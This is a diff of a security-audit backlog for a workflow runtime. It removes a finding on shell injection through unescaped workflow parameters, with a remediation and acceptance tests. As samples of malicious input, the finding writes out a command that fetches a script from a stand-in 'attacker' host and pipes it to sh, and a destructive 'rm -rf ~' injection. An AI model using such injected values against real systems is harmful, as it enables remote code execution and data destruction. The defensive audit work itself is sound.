@@ -14,22 +14,6 @@ Process rules:
 
 ***
 
-## Stop splicing untrusted workflow values into `sh -c` #dev-ready
-
-Context: ASI-01/ASI-02, HIGH, confidence 0.85. Finding H-1 — the flagship shell-injection sink, traced end-to-end and confirmed by hand.
-
-Problem: Any non-keyword line in a `workflow { … }` block falls through to a `shell` exec body (`shellFallthrough`, `workflow-brace.ts:769-772`). At runtime the body is interpolated with a bare `String.replace` of `${name}` (zero shell escaping, `runtime-arg-parser.ts:31-44`) and handed to `spawnAndCapture(resolveShell(), ["-c", command], …)` (`executeShLine`, `node-workflow-runtime.ts:1673-1675`). Workflow parameters are caller-controlled: `jaiph mcp`/`jaiph serve` bind tool-call arguments positionally to params (`mcp.ts:129-141`). A caller (or a prompt-injected model) invoking `greet(name)` with `name = "$(curl -s http://attacker/x | sh)"` or `name = "; rm -rf ~ #"` gets arbitrary command execution — host RCE under `--unsafe`/standalone image, in-sandbox code execution + credential theft otherwise. The only guard, `warnPromptInShellLine` (`validate-step.ts:626-649`), inspects `ctx.promptCaptures` only, so it misses parameters, non-prompt captures, channel, and nested-`run` values.
-
-Location: `src/runtime/kernel/node-workflow-runtime.ts:1076-1091` and `:1673-1675`; `src/runtime/kernel/runtime-arg-parser.ts:31-44`; `src/parse/workflow-brace.ts:769-772`; `src/transpile/validate-step.ts:626-649`.
-
-Remediation: Never splice runtime values into `sh -c`. Route them through argv (as `script` steps already do — `run my_script(name)`), or shell-quote every interpolated `${var}` before it enters `sh -c` (a `shellQuote` already exists at `prompt.ts:170-181`). At minimum upgrade the guard to a hard error that fires for any interpolated variable — parameter, capture, iterator, or channel value — in a `shell` body.
-
-### Acceptance criteria
-- A workflow `greet(name) { echo "Hello ${name}" }` invoked with `name = "$(id)"` (via mcp/serve param binding or direct run) does not execute the command substitution — output contains the literal `$(id)` text, not the result of `id`.
-- Invoking the same workflow with `name = "; touch /tmp/pwned #"` does not create `/tmp/pwned` (no shell metacharacter breakout).
-- A test exercises the mcp/serve positional param path (`args[p]`) reaching a `shell` body and asserts no interpolated value is shell-evaluated.
-- If the chosen fix is a hard guard rather than escaping, compiling a `shell` body that interpolates any parameter/capture/iterator/channel variable is a hard error (not a warning), and a test asserts the error for each provenance.
-
 ## Exclude host-only `JAIPH_SERVE_*` keys from the sandbox env forward #dev-ready
 
 Context: ASI-08/ASI-05, HIGH, confidence 0.80. Finding H-2 — the serve operator bearer token crosses the sandbox boundary.
